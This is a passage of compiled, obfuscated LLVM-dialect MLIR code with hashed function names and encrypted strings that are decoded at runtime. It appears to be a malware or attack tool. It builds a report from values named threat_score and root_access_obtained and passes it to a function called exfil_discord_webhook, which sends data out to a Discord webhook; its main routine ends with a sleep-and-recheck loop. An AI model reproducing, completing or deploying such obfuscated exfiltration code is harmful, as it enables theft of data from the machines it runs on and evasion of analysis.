    %65 = llvm.getelementptr %18[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %66 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %67 = llvm.getelementptr %19[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    llvm.call @f_0218a827(%64, %65, %66, %67) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    %68 = llvm.getelementptr %20[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
    llvm.call @println(%68) : (!llvm.ptr) -> ()
    %69 = llvm.getelementptr %21[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<41 x i8>
    %70 = llvm.load %8 {alignment = 8 : i64} : !llvm.ptr -> f64
    %71 = llvm.fptosi %70 : f64 to i64
    %72 = llvm.call @string(%71) : (i64) -> !llvm.ptr
    %73 = llvm.call @jocky_str_concat(%69, %72) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %74 = llvm.getelementptr %22[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<15 x i8>
    %75 = llvm.call @jocky_str_concat(%73, %74) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %76 = llvm.load %16 {alignment = 4 : i64} : !llvm.ptr -> i32
    %77 = llvm.sext %76 : i32 to i64
    %78 = llvm.call @string(%77) : (i64) -> !llvm.ptr
    %79 = llvm.call @jocky_str_concat(%75, %78) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %80 = llvm.getelementptr %23[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %81 = llvm.call @jocky_str_concat(%79, %80) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %82 = llvm.load %24 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %83 = llvm.call @array_len(%82) : (!llvm.ptr) -> i64
    %84 = llvm.call @string(%83) : (i64) -> !llvm.ptr
    %85 = llvm.call @jocky_str_concat(%81, %84) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %85, %33 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %86 = llvm.getelementptr %25[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<42 x i8>
    %87 = llvm.load %33 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %88 = llvm.call @exfil_discord_webhook(%86, %87) : (!llvm.ptr, !llvm.ptr) -> i32
    llvm.store %88, %34 {alignment = 4 : i64} : i32, !llvm.ptr
    %89 = llvm.load %34 {alignment = 4 : i64} : !llvm.ptr -> i32
    %90 = llvm.icmp "eq" %89, %2 : i32
    llvm.cond_br %90, ^bb5, ^bb6
  ^bb5:  // pred: ^bb4
    %91 = llvm.getelementptr %26[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
    llvm.call @println(%91) : (!llvm.ptr) -> ()
    %92 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    %93 = llvm.getelementptr %27[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    %94 = llvm.getelementptr %28[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %95 = llvm.getelementptr %19[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    llvm.call @f_0218a827(%92, %93, %94, %95) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb6
  ^bb6:  // 2 preds: ^bb4, ^bb5
    %96 = llvm.getelementptr %29[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%96) : (!llvm.ptr) -> ()
    %97 = llvm.getelementptr %30[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%97) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @f_4b0d211b() {
    %0 = llvm.mlir.addressof @".str.101.enc" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.8.enc" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.102.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.103.enc" : !llvm.ptr
    %5 = llvm.mlir.addressof @operations_count : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.104.enc" : !llvm.ptr
    %7 = llvm.mlir.addressof @g_a0b3b851 : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.105.enc" : !llvm.ptr
    %9 = llvm.mlir.addressof @g_e836b4e8 : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.106.enc" : !llvm.ptr
    %11 = llvm.mlir.addressof @g_b7bfea9b : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.107.enc" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.108.enc" : !llvm.ptr
    %14 = llvm.mlir.addressof @threat_score : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.109.enc" : !llvm.ptr
    %16 = llvm.mlir.addressof @root_access_obtained : !llvm.ptr
    %17 = llvm.mlir.addressof @".str.110.enc" : !llvm.ptr
    %18 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @println(%18) : (!llvm.ptr) -> ()
    %19 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%19) : (!llvm.ptr) -> ()
    %20 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<50 x i8>
    llvm.call @println(%20) : (!llvm.ptr) -> ()
    %21 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    %22 = llvm.load %5 {alignment = 4 : i64} : !llvm.ptr -> i32
    %23 = llvm.sext %22 : i32 to i64
    %24 = llvm.call @string(%23) : (i64) -> !llvm.ptr
    %25 = llvm.call @jocky_str_concat(%21, %24) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%25) : (!llvm.ptr) -> ()
    %26 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<32 x i8>
    %27 = llvm.load %7 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %28 = llvm.call @array_len(%27) : (!llvm.ptr) -> i64
    %29 = llvm.call @string(%28) : (i64) -> !llvm.ptr
    %30 = llvm.call @jocky_str_concat(%26, %29) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%30) : (!llvm.ptr) -> ()
    %31 = llvm.getelementptr %8[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    %32 = llvm.load %9 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %33 = llvm.call @array_len(%32) : (!llvm.ptr) -> i64
    %34 = llvm.call @string(%33) : (i64) -> !llvm.ptr
    %35 = llvm.call @jocky_str_concat(%31, %34) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%35) : (!llvm.ptr) -> ()
    %36 = llvm.getelementptr %10[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    %37 = llvm.load %11 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %38 = llvm.call @array_len(%37) : (!llvm.ptr) -> i64
    %39 = llvm.call @string(%38) : (i64) -> !llvm.ptr
    %40 = llvm.call @jocky_str_concat(%36, %39) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%40) : (!llvm.ptr) -> ()
    %41 = llvm.getelementptr %12[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<49 x i8>
    llvm.call @println(%41) : (!llvm.ptr) -> ()
    %42 = llvm.getelementptr %13[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<24 x i8>
    %43 = llvm.load %14 {alignment = 8 : i64} : !llvm.ptr -> f64
    %44 = llvm.fptosi %43 : f64 to i64
    %45 = llvm.call @string(%44) : (i64) -> !llvm.ptr
    %46 = llvm.call @jocky_str_concat(%42, %45) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%46) : (!llvm.ptr) -> ()
    %47 = llvm.getelementptr %15[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
    %48 = llvm.load %16 {alignment = 1 : i64} : !llvm.ptr -> i1
    %49 = llvm.zext %48 : i1 to i64
    %50 = llvm.call @string(%49) : (i64) -> !llvm.ptr
    %51 = llvm.call @jocky_str_concat(%47, %50) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%51) : (!llvm.ptr) -> ()
    %52 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%52) : (!llvm.ptr) -> ()
    %53 = llvm.getelementptr %17[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<44 x i8>
    llvm.call @println(%53) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @main() {
    %0 = llvm.mlir.addressof @".str.8.enc" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.111.enc" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.112.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.113.enc" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.114.enc" : !llvm.ptr
    llvm.call @f_f8b7e158() : () -> ()
    %6 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%6) : (!llvm.ptr) -> ()
    llvm.call @f_b9127cd9() : () -> ()
    %7 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%7) : (!llvm.ptr) -> ()
    llvm.call @f_b610cf36() : () -> ()
    %8 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%8) : (!llvm.ptr) -> ()
    llvm.call @f_97a724e0() : () -> ()
    %9 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%9) : (!llvm.ptr) -> ()
    llvm.call @f_c1c92895() : () -> ()
    %10 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%10) : (!llvm.ptr) -> ()
    llvm.call @f_fe69c41f() : () -> ()
    %11 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%11) : (!llvm.ptr) -> ()
    llvm.call @f_53decde1() : () -> ()
    %12 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%12) : (!llvm.ptr) -> ()
    llvm.call @f_4b0d211b() : () -> ()
    %13 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%13) : (!llvm.ptr) -> ()
    %14 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<55 x i8>
    llvm.call @println(%14) : (!llvm.ptr) -> ()
    %15 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
    llvm.call @println(%15) : (!llvm.ptr) -> ()
    %16 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<51 x i8>
    llvm.call @println(%16) : (!llvm.ptr) -> ()
    %17 = llvm.getelementptr %5[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<57 x i8>
    llvm.call @println(%17) : (!llvm.ptr) -> ()
    %18 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%18) : (!llvm.ptr) -> ()
    llvm.call @jocky_sleep_and_recheck() : () -> ()
    llvm.return
  }
  llvm.func internal @f_64c2918f() attributes {no_inline} {
    %0 = llvm.mlir.addressof @".str.0.enc" : !llvm.ptr
    %1 = llvm.mlir.constant(51 : i64) : i64
    %2 = llvm.call @f_61ae7c24(%0, %1) : (!llvm.ptr, i64) -> !llvm.ptr
    %3 = llvm.mlir.addressof @".str.1.enc" : !llvm.ptr
    %4 = llvm.mlir.constant(16 : i64) : i64
    %5 = llvm.call @f_61ae7c24(%3, %4) : (!llvm.ptr, i64) -> !llvm.ptr
    %6 = llvm.mlir.addressof @".str.2.enc" : !llvm.ptr
    %7 = llvm.mlir.constant(59 : i64) : i64
    %8 = llvm.call @f_61ae7c24(%6, %7) : (!llvm.ptr, i64) -> !llvm.ptr
    %9 = llvm.mlir.addressof @".str.3.enc" : !llvm.ptr
    %10 = llvm.mlir.constant(48 : i64) : i64
    %11 = llvm.call @f_61ae7c24(%9, %10) : (!llvm.ptr, i64) -> !llvm.ptr
    %12 = llvm.mlir.addressof @".str.4.enc" : !llvm.ptr
    %13 = llvm.mlir.constant(43 : i64) : i64
    %14 = llvm.call @f_61ae7c24(%12, %13) : (!llvm.ptr, i64) -> !llvm.ptr
    %15 = llvm.mlir.addressof @".str.5.enc" : !llvm.ptr
    %16 = llvm.mlir.constant(45 : i64) : i64
    %17 = llvm.call @f_61ae7c24(%15, %16) : (!llvm.ptr, i64) -> !llvm.ptr
    %18 = llvm.mlir.addressof @".str.6.enc" : !llvm.ptr
    %19 = llvm.mlir.constant(62 : i64) : i64
    %20 = llvm.call @f_61ae7c24(%18, %19) : (!llvm.ptr, i64) -> !llvm.ptr
    %21 = llvm.mlir.addressof @".str.7.enc" : !llvm.ptr
    %22 = llvm.mlir.constant(45 : i64) : i64
    %23 = llvm.call @f_61ae7c24(%21, %22) : (!llvm.ptr, i64) -> !llvm.ptr
    %24 = llvm.mlir.addressof @".str.8.enc" : !llvm.ptr
    %25 = llvm.mlir.constant(1 : i64) : i64
    %26 = llvm.call @f_61ae7c24(%24, %25) : (!llvm.ptr, i64) -> !llvm.ptr
    %27 = llvm.mlir.addressof @".str.9.enc" : !llvm.ptr
    %28 = llvm.mlir.constant(8 : i64) : i64
    %29 = llvm.call @f_61ae7c24(%27, %28) : (!llvm.ptr, i64) -> !llvm.ptr
    %30 = llvm.mlir.addressof @".str.10.enc" : !llvm.ptr
    %31 = llvm.mlir.constant(11 : i64) : i64
    %32 = llvm.call @f_61ae7c24(%30, %31) : (!llvm.ptr, i64) -> !llvm.ptr
    %33 = llvm.mlir.addressof @".str.11.enc" : !llvm.ptr
    %34 = llvm.mlir.constant(27 : i64) : i64
    %35 = llvm.call @f_61ae7c24(%33, %34) : (!llvm.ptr, i64) -> !llvm.ptr
    %36 = llvm.mlir.addressof @".str.12.enc" : !llvm.ptr
    %37 = llvm.mlir.constant(6 : i64) : i64
    %38 = llvm.call @f_61ae7c24(%36, %37) : (!llvm.ptr, i64) -> !llvm.ptr
    %39 = llvm.mlir.addressof @".str.13.enc" : !llvm.ptr
    %40 = llvm.mlir.constant(28 : i64) : i64
    %41 = llvm.call @f_61ae7c24(%39, %40) : (!llvm.ptr, i64) -> !llvm.ptr
    %42 = llvm.mlir.addressof @".str.14.enc" : !llvm.ptr
    %43 = llvm.mlir.constant(47 : i64) : i64
    %44 = llvm.call @f_61ae7c24(%42, %43) : (!llvm.ptr, i64) -> !llvm.ptr
    %45 = llvm.mlir.addressof @".str.15.enc" : !llvm.ptr
    %46 = llvm.mlir.constant(44 : i64) : i64
    %47 = llvm.call @f_61ae7c24(%45, %46) : (!llvm.ptr, i64) -> !llvm.ptr
    %48 = llvm.mlir.addressof @".str.16.enc" : !llvm.ptr
    %49 = llvm.mlir.constant(25 : i64) : i64
    %50 = llvm.call @f_61ae7c24(%48, %49) : (!llvm.ptr, i64) -> !llvm.ptr
    %51 = llvm.mlir.addressof @".str.17.enc" : !llvm.ptr
    %52 = llvm.mlir.constant(4 : i64) : i64
    %53 = llvm.call @f_61ae7c24(%51, %52) : (!llvm.ptr, i64) -> !llvm.ptr
    %54 = llvm.mlir.addressof @".str.18.enc" : !llvm.ptr
    %55 = llvm.mlir.constant(2 : i64) : i64
    %56 = llvm.call @f_61ae7c24(%54, %55) : (!llvm.ptr, i64) -> !llvm.ptr
    %57 = llvm.mlir.addressof @".str.19.enc" : !llvm.ptr
    %58 = llvm.mlir.constant(3 : i64) : i64
    %59 = llvm.call @f_61ae7c24(%57, %58) : (!llvm.ptr, i64) -> !llvm.ptr
    %60 = llvm.mlir.addressof @".str.20.enc" : !llvm.ptr
    %61 = llvm.mlir.constant(20 : i64) : i64
    %62 = llvm.call @f_61ae7c24(%60, %61) : (!llvm.ptr, i64) -> !llvm.ptr
    %63 = llvm.mlir.addressof @".str.21.enc" : !llvm.ptr
    %64 = llvm.mlir.constant(11 : i64) : i64
    %65 = llvm.call @f_61ae7c24(%63, %64) : (!llvm.ptr, i64) -> !llvm.ptr
    %66 = llvm.mlir.addressof @".str.22.enc" : !llvm.ptr
    %67 = llvm.mlir.constant(51 : i64) : i64
    %68 = llvm.call @f_61ae7c24(%66, %67) : (!llvm.ptr, i64) -> !llvm.ptr
    %69 = llvm.mlir.addressof @".str.23.enc" : !llvm.ptr
    %70 = llvm.mlir.constant(45 : i64) : i64
    %71 = llvm.call @f_61ae7c24(%69, %70) : (!llvm.ptr, i64) -> !llvm.ptr
    %72 = llvm.mlir.addressof @".str.24.enc" : !llvm.ptr
    %73 = llvm.mlir.constant(15 : i64) : i64
    %74 = llvm.call @f_61ae7c24(%72, %73) : (!llvm.ptr, i64) -> !llvm.ptr
    %75 = llvm.mlir.addressof @".str.25.enc" : !llvm.ptr
    %76 = llvm.mlir.constant(14 : i64) : i64
    %77 = llvm.call @f_61ae7c24(%75, %76) : (!llvm.ptr, i64) -> !llvm.ptr
    %78 = llvm.mlir.addressof @".str.26.enc" : !llvm.ptr
    %79 = llvm.mlir.constant(14 : i64) : i64
    %80 = llvm.call @f_61ae7c24(%78, %79) : (!llvm.ptr, i64) -> !llvm.ptr
    %81 = llvm.mlir.addressof @".str.27.enc" : !llvm.ptr
    %82 = llvm.mlir.constant(46 : i64) : i64
    %83 = llvm.call @f_61ae7c24(%81, %82) : (!llvm.ptr, i64) -> !llvm.ptr
    %84 = llvm.mlir.addressof @".str.28.enc" : !llvm.ptr
    %85 = llvm.mlir.constant(11 : i64) : i64
    %86 = llvm.call @f_61ae7c24(%84, %85) : (!llvm.ptr, i64) -> !llvm.ptr
    %87 = llvm.mlir.addressof @".str.29.enc" : !llvm.ptr
    %88 = llvm.mlir.constant(28 : i64) : i64
    %89 = llvm.call @f_61ae7c24(%87, %88) : (!llvm.ptr, i64) -> !llvm.ptr
    %90 = llvm.mlir.addressof @".str.30.enc" : !llvm.ptr
    %91 = llvm.mlir.constant(47 : i64) : i64
    %92 = llvm.call @f_61ae7c24(%90, %91) : (!llvm.ptr, i64) -> !llvm.ptr
    %93 = llvm.mlir.addressof @".str.31.enc" : !llvm.ptr
    %94 = llvm.mlir.constant(58 : i64) : i64
    %95 = llvm.call @f_61ae7c24(%93, %94) : (!llvm.ptr, i64) -> !llvm.ptr
    %96 = llvm.mlir.addressof @".str.32.enc" : !llvm.ptr
    %97 = llvm.mlir.constant(71 : i64) : i64
    %98 = llvm.call @f_61ae7c24(%96, %97) : (!llvm.ptr, i64) -> !llvm.ptr
    %99 = llvm.mlir.addressof @".str.33.enc" : !llvm.ptr
    %100 = llvm.mlir.constant(45 : i64) : i64
    %101 = llvm.call @f_61ae7c24(%99, %100) : (!llvm.ptr, i64) -> !llvm.ptr
    %102 = llvm.mlir.addressof @".str.34.enc" : !llvm.ptr
    %103 = llvm.mlir.constant(27 : i64) : i64
    %104 = llvm.call @f_61ae7c24(%102, %103) : (!llvm.ptr, i64) -> !llvm.ptr
    %105 = llvm.mlir.addressof @".str.35.enc" : !llvm.ptr
    %106 = llvm.mlir.constant(16 : i64) : i64
    %107 = llvm.call @f_61ae7c24(%105, %106) : (!llvm.ptr, i64) -> !llvm.ptr
    %108 = llvm.mlir.addressof @".str.36.enc" : !llvm.ptr
    %109 = llvm.mlir.constant(24 : i64) : i64
    %110 = llvm.call @f_61ae7c24(%108, %109) : (!llvm.ptr, i64) -> !llvm.ptr
    %111 = llvm.mlir.addressof @".str.37.enc" : !llvm.ptr
    %112 = llvm.mlir.constant(10 : i64) : i64
    %113 = llvm.call @f_61ae7c24(%111, %112) : (!llvm.ptr, i64) -> !llvm.ptr
    %114 = llvm.mlir.addressof @".str.38.enc" : !llvm.ptr
    %115 = llvm.mlir.constant(12 : i64) : i64
    %116 = llvm.call @f_61ae7c24(%114, %115) : (!llvm.ptr, i64) -> !llvm.ptr
    %117 = llvm.mlir.addressof @".str.39.enc" : !llvm.ptr
    %118 = llvm.mlir.constant(7 : i64) : i64
    %119 = llvm.call @f_61ae7c24(%117, %118) : (!llvm.ptr, i64) -> !llvm.ptr
    %120 = llvm.mlir.addressof @".str.40.enc" : !llvm.ptr
    %121 = llvm.mlir.constant(53 : i64) : i64
    %122 = llvm.call @f_61ae7c24(%120, %121) : (!llvm.ptr, i64) -> !llvm.ptr
    %123 = llvm.mlir.addressof @".str.41.enc" : !llvm.ptr
    %124 = llvm.mlir.constant(34 : i64) : i64
    %125 = llvm.call @f_61ae7c24(%123, %124) : (!llvm.ptr, i64) -> !llvm.ptr
    %126 = llvm.mlir.addressof @".str.42.enc" : !llvm.ptr
    %127 = llvm.mlir.constant(7 : i64) : i64
    %128 = llvm.call @f_61ae7c24(%126, %127) : (!llvm.ptr, i64) -> !llvm.ptr
    %129 = llvm.mlir.addressof @".str.43.enc" : !llvm.ptr
    %130 = llvm.mlir.constant(46 : i64) : i64
    %131 = llvm.call @f_61ae7c24(%129, %130) : (!llvm.ptr, i64) -> !llvm.ptr
    %132 = llvm.mlir.addressof @".str.44.enc" : !llvm.ptr
    %133 = llvm.mlir.constant(23 : i64) : i64
    %134 = llvm.call @f_61ae7c24(%132, %133) : (!llvm.ptr, i64) -> !llvm.ptr
    %135 = llvm.mlir.addressof @".str.45.enc" : !llvm.ptr
    %136 = llvm.mlir.constant(21 : i64) : i64
    %137 = llvm.call @f_61ae7c24(%135, %136) : (!llvm.ptr, i64) -> !llvm.ptr
    %138 = llvm.mlir.addressof @".str.46.enc" : !llvm.ptr
    %139 = llvm.mlir.constant(43 : i64) : i64
    %140 = llvm.call @f_61ae7c24(%138, %139) : (!llvm.ptr, i64) -> !llvm.ptr
    %141 = llvm.mlir.addressof @".str.47.enc" : !llvm.ptr
    %142 = llvm.mlir.constant(9 : i64) : i64
    %143 = llvm.call @f_61ae7c24(%141, %142) : (!llvm.ptr, i64) -> !llvm.ptr
    %144 = llvm.mlir.addressof @".str.48.enc" : !llvm.ptr
    %145 = llvm.mlir.constant(15 : i64) : i64
    %146 = llvm.call @f_61ae7c24(%144, %145) : (!llvm.ptr, i64) -> !llvm.ptr
    %147 = llvm.mlir.addressof @".str.49.enc" : !llvm.ptr
    %148 = llvm.mlir.constant(10 : i64) : i64
    %149 = llvm.call @f_61ae7c24(%147, %148) : (!llvm.ptr, i64) -> !llvm.ptr
    %150 = llvm.mlir.addressof @".str.50.enc" : !llvm.ptr
    %151 = llvm.mlir.constant(43 : i64) : i64
    %152 = llvm.call @f_61ae7c24(%150, %151) : (!llvm.ptr, i64) -> !llvm.ptr
    %153 = llvm.mlir.addressof @".str.51.enc" : !llvm.ptr
    %154 = llvm.mlir.constant(12 : i64) : i64
    %155 = llvm.call @f_61ae7c24(%153, %154) : (!llvm.ptr, i64) -> !llvm.ptr
    %156 = llvm.mlir.addressof @".str.52.enc" : !llvm.ptr
    %157 = llvm.mlir.constant(13 : i64) : i64
    %158 = llvm.call @f_61ae7c24(%156, %157) : (!llvm.ptr, i64) -> !llvm.ptr
    %159 = llvm.mlir.addressof @".str.53.enc" : !llvm.ptr
    %160 = llvm.mlir.constant(7 : i64) : i64
    %161 = llvm.call @f_61ae7c24(%159, %160) : (!llvm.ptr, i64) -> !llvm.ptr
    %162 = llvm.mlir.addressof @".str.54.enc" : !llvm.ptr
    %163 = llvm.mlir.constant(32 : i64) : i64
    %164 = llvm.call @f_61ae7c24(%162, %163) : (!llvm.ptr, i64) -> !llvm.ptr
    %165 = llvm.mlir.addressof @".str.55.enc" : !llvm.ptr
    %166 = llvm.mlir.constant(18 : i64) : i64
    %167 = llvm.call @f_61ae7c24(%165, %166) : (!llvm.ptr, i64) -> !llvm.ptr
    %168 = llvm.mlir.addressof @".str.56.enc" : !llvm.ptr
    %169 = llvm.mlir.constant(35 : i64) : i64
    %170 = llvm.call @f_61ae7c24(%168, %169) : (!llvm.ptr, i64) -> !llvm.ptr
    %171 = llvm.mlir.addressof @".str.57.enc" : !llvm.ptr
    %172 = llvm.mlir.constant(26 : i64) : i64
    %173 = llvm.call @f_61ae7c24(%171, %172) : (!llvm.ptr, i64) -> !llvm.ptr
    %174 = llvm.mlir.addressof @".str.58.enc" : !llvm.ptr
    %175 = llvm.mlir.constant(29 : i64) : i64
    %176 = llvm.call @f_61ae7c24(%174, %175) : (!llvm.ptr, i64) -> !llvm.ptr
    %177 = llvm.mlir.addressof @".str.59.enc" : !llvm.ptr
    %178 = llvm.mlir.constant(36 : i64) : i64
    %179 = llvm.call @f_61ae7c24(%177, %178) : (!llvm.ptr, i64) -> !llvm.ptr
    %180 = llvm.mlir.addressof @".str.60.enc" : !llvm.ptr
    %181 = llvm.mlir.constant(42 : i64) : i64
    %182 = llvm.call @f_61ae7c24(%180, %181) : (!llvm.ptr, i64) -> !llvm.ptr
    %183 = llvm.mlir.addressof @".str.61.enc" : !llvm.ptr
    %184 = llvm.mlir.constant(27 : i64) : i64
    %185 = llvm.call @f_61ae7c24(%183, %184) : (!llvm.ptr, i64) -> !llvm.ptr
    %186 = llvm.mlir.addressof @".str.62.enc" : !llvm.ptr
    %187 = llvm.mlir.constant(36 : i64) : i64
    %188 = llvm.call @f_61ae7c24(%186, %187) : (!llvm.ptr, i64) -> !llvm.ptr
    %189 = llvm.mlir.addressof @".str.63.enc" : !llvm.ptr
    %190 = llvm.mlir.constant(23 : i64) : i64
    %191 = llvm.call @f_61ae7c24(%189, %190) : (!llvm.ptr, i64) -> !llvm.ptr
    %192 = llvm.mlir.addressof @".str.64.enc" : !llvm.ptr
    %193 = llvm.mlir.constant(10 : i64) : i64
    %194 = llvm.call @f_61ae7c24(%192, %193) : (!llvm.ptr, i64) -> !llvm.ptr
    %195 = llvm.mlir.addressof @".str.65.enc" : !llvm.ptr
    %196 = llvm.mlir.constant(12 : i64) : i64
    %197 = llvm.call @f_61ae7c24(%195, %196) : (!llvm.ptr, i64) -> !llvm.ptr
    %198 = llvm.mlir.addressof @".str.66.enc" : !llvm.ptr
    %199 = llvm.mlir.constant(12 : i64) : i64
    %200 = llvm.call @f_61ae7c24(%198, %199) : (!llvm.ptr, i64) -> !llvm.ptr
    %201 = llvm.mlir.addressof @".str.67.enc" : !llvm.ptr
    %202 = llvm.mlir.constant(8 : i64) : i64
    %203 = llvm.call @f_61ae7c24(%201, %202) : (!llvm.ptr, i64) -> !llvm.ptr
    %204 = llvm.mlir.addressof @".str.68.enc" : !llvm.ptr
    %205 = llvm.mlir.constant(32 : i64) : i64
    %206 = llvm.call @f_61ae7c24(%204, %205) : (!llvm.ptr, i64) -> !llvm.ptr
    %207 = llvm.mlir.addressof @".str.69.enc" : !llvm.ptr
    %208 = llvm.mlir.constant(13 : i64) : i64
    %209 = llvm.call @f_61ae7c24(%207, %208) : (!llvm.ptr, i64) -> !llvm.ptr
    %210 = llvm.mlir.addressof @".str.70.enc" : !llvm.ptr
    %211 = llvm.mlir.constant(13 : i64) : i64
    %212 = llvm.call @f_61ae7c24(%210, %211) : (!llvm.ptr, i64) -> !llvm.ptr
    %213 = llvm.mlir.addressof @".str.71.enc" : !llvm.ptr
    %214 = llvm.mlir.constant(27 : i64) : i64
    %215 = llvm.call @f_61ae7c24(%213, %214) : (!llvm.ptr, i64) -> !llvm.ptr
    %216 = llvm.mlir.addressof @".str.72.enc" : !llvm.ptr
    %217 = llvm.mlir.constant(10 : i64) : i64
    %218 = llvm.call @f_61ae7c24(%216, %217) : (!llvm.ptr, i64) -> !llvm.ptr
    %219 = llvm.mlir.addressof @".str.73.enc" : !llvm.ptr
    %220 = llvm.mlir.constant(14 : i64) : i64
    %221 = llvm.call @f_61ae7c24(%219, %220) : (!llvm.ptr, i64) -> !llvm.ptr
    %222 = llvm.mlir.addressof @".str.74.enc" : !llvm.ptr
    %223 = llvm.mlir.constant(51 : i64) : i64
    %224 = llvm.call @f_61ae7c24(%222, %223) : (!llvm.ptr, i64) -> !llvm.ptr
    %225 = llvm.mlir.addressof @".str.75.enc" : !llvm.ptr
